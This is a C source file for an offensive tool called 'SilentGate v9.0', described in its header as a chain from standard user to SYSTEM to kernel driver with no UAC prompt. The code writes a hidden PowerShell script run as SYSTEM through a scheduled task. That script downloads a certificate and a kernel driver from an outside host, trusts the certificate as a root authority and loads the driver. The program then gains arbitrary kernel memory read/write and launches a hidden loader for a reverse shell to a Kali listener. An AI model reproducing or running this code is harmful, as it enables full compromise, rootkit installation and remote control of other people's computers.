/*
 * SilentGate v9.0 - Full Chain No UAC
 * Author: JarDani
 * Standard user -> Task Scheduler SYSTEM -> Kernel driver
 * No UAC prompt at any step
 */
#include <windows.h>
#include <psapi.h>
#include <tlhelp32.h>
#include <stdio.h>

#define IOCTL_SG_READ_VIRTUAL  CTL_CODE(FILE_DEVICE_UNKNOWN, 0x900, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_SG_WRITE_VIRTUAL CTL_CODE(FILE_DEVICE_UNKNOWN, 0x901, METHOD_BUFFERED, FILE_ANY_ACCESS)
typedef struct { ULONG64 address; ULONG size; UCHAR data[256]; } SG_MEM;

BOOL vm_read(HANDLE h, ULONG64 addr, PVOID buf, ULONG size) {
    SG_MEM req={0}; req.address=addr; req.size=size<256?size:256;
    DWORD bytes=0;
    return DeviceIoControl(h,IOCTL_SG_READ_VIRTUAL,
        &req,sizeof(req),buf,size,&bytes,NULL);
}

BOOL vm_write(HANDLE h, ULONG64 addr, PVOID buf, ULONG size) {
    SG_MEM req={0}; req.address=addr; req.size=size<256?size:256;
    if(req.size>0) memcpy(req.data,buf,req.size);
    DWORD bytes=0;
    return DeviceIoControl(h,IOCTL_SG_WRITE_VIRTUAL,
        &req,sizeof(req),&req,sizeof(req),&bytes,NULL);
}

DWORD get_pid(const char* name) {
    HANDLE snap=CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,0);
    PROCESSENTRY32 pe; pe.dwSize=sizeof(pe);
    DWORD pid=0;
    if(Process32First(snap,&pe)){
        do{if(_stricmp(pe.szExeFile,name)==0){pid=pe.th32ProcessID;break;}
        }while(Process32Next(snap,&pe));
    }
    CloseHandle(snap);
    return pid;
}

int load_driver_via_task(const char* drv_url, const char* cert_url) {
    printf("[TASK] Creating scheduled task to load driver as SYSTEM...\n");

    /* Create PowerShell script in temp */
    char ps_path[MAX_PATH];
    GetTempPathA(MAX_PATH, ps_path);
    strcat(ps_path, "sg_load.ps1");

    FILE* f=fopen(ps_path,"w");
    if(!f) return 0;

    fprintf(f,"$cert_url='%s'\n",cert_url);
    fprintf(f,"$drv_url='%s'\n",drv_url);
    fprintf(f,"$drv_path='C:\\Windows\\System32\\drivers\\sgdrv.sys'\n");
    fprintf(f,"$cert_path='C:\\Windows\\Temp\\sg_cert.crt'\n");
    fprintf(f,"(New-Object Net.WebClient).DownloadFile($cert_url,$cert_path)\n");
    fprintf(f,"certutil -addstore TrustedPublisher $cert_path | Out-Null\n");
    fprintf(f,"certutil -addstore Root $cert_path | Out-Null\n");
    fprintf(f,"(New-Object Net.WebClient).DownloadFile($drv_url,$drv_path)\n");
    fprintf(f,"sc.exe create SilentGate binPath= $drv_path type= kernel start= demand\n");
    fprintf(f,"sc.exe start SilentGate\n");
    fprintf(f,"'DONE' | Out-File 'C:\\Windows\\Temp\\sg_done.txt'\n");
    fclose(f);

    printf("[TASK] Script written to: %s\n", ps_path);

    /* Delete status file if exists */
    DeleteFileA("C:\\Windows\\Temp\\sg_done.txt");

    /* Create scheduled task running as SYSTEM */
    char cmd[1024];
    snprintf(cmd, sizeof(cmd),
        "schtasks /create /tn \"SilentGateLoader\" "
        "/tr \"powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File \\\"%s\\\"\" "
        "/sc once /st 00:00 /ru SYSTEM /f",
        ps_path);

    system(cmd);

    /* Run immediately */
    system("schtasks /run /tn \"SilentGateLoader\"");
    printf("[TASK] Task running as SYSTEM...\n");

    /* Wait for completion */
    printf("[TASK] Waiting for driver to load");
    for(int i=0;i<30;i++){
        Sleep(1000);
        printf(".");
        fflush(stdout);
        DWORD attrs=GetFileAttributesA("C:\\Windows\\Temp\\sg_done.txt");
        if(attrs!=INVALID_FILE_ATTRIBUTES){
            printf("\n[TASK] Driver loaded by SYSTEM task\n");
            break;
        }
    }
    printf("\n");

    /* Cleanup task */
    system("schtasks /delete /tn \"SilentGateLoader\" /f");
    return 1;
}

int main() {
    printf("[V9] SilentGate v9.0 - No UAC Full Chain\n");
    printf("[V9] Author: JarDani\n\n");

    /* Step 1: Load driver via Task Scheduler SYSTEM */
    load_driver_via_task(
        "http://192.168.217.146:8080/output/v9/sg_driver_signed.sys",
        "http://192.168.217.146:8080/output/v9/sg_test.crt"
    );

    /* Step 2: Open device - now available as standard user */
    printf("[V9] Opening kernel driver device...\n");
    HANDLE g_h=CreateFileA("\\\\.\\SilentGate",
        GENERIC_READ|GENERIC_WRITE,0,NULL,
        OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL);

    if(g_h==INVALID_HANDLE_VALUE){
        printf("[V9] Device open failed: %lu\n",GetLastError());
        printf("[V9] Driver may not have loaded\n");
        getchar(); return 1;
    }

    printf("[V9] Kernel driver device opened - NO UAC\n\n");

    /* Step 3: Verify kernel R/W */
    DWORD n=0; EnumDeviceDrivers(NULL,0,&n);
    LPVOID* d=(LPVOID*)malloc(n); EnumDeviceDrivers(d,n,&n);
    DWORD64 ntos=0; char name[MAX_PATH];
    for(DWORD i=0;i<n/sizeof(LPVOID);i++){
        GetDeviceDriverBaseNameA(d[i],name,MAX_PATH);
        if(_stricmp(name,"ntoskrnl.exe")==0||_stricmp(name,"ntkrnlmp.exe")==0)
            {ntos=(DWORD64)d[i];break;}
    } free(d);

    BYTE buf[4]={0};
    if(vm_read(g_h,ntos,buf,4)){
        printf("[V9] ntoskrnl MZ: %02X %02X %02X %02X\n",
            buf[0],buf[1],buf[2],buf[3]);
        if(buf[0]==0x4D&&buf[1]==0x5A)
            printf("[V9] KERNEL R/W CONFIRMED - NO UAC\n\n");
    }

    /* Step 4: Execute shell */
    printf("[V9] Launching shell...\n");
    char shell[MAX_PATH],dir[MAX_PATH];
    GetModuleFileNameA(NULL,dir,MAX_PATH);
    char* p=strrchr(dir,'\\');if(p)*p='\0';
    snprintf(shell,MAX_PATH,"%s\\sg_loader.exe",dir);

    STARTUPINFOA si={sizeof(si)};
    PROCESS_INFORMATION pi={0};
    si.dwFlags=STARTF_USESHOWWINDOW;
    si.wShowWindow=SW_HIDE;
    CreateProcessA(shell,NULL,NULL,NULL,FALSE,
        CREATE_NO_WINDOW,NULL,NULL,&si,&pi);

    printf("[V9] Shell launched - check Kali nc\n");

    CloseHandle(g_h);
    printf("\n[V9] Done - press Enter\n");
    getchar();
    return 0;
}
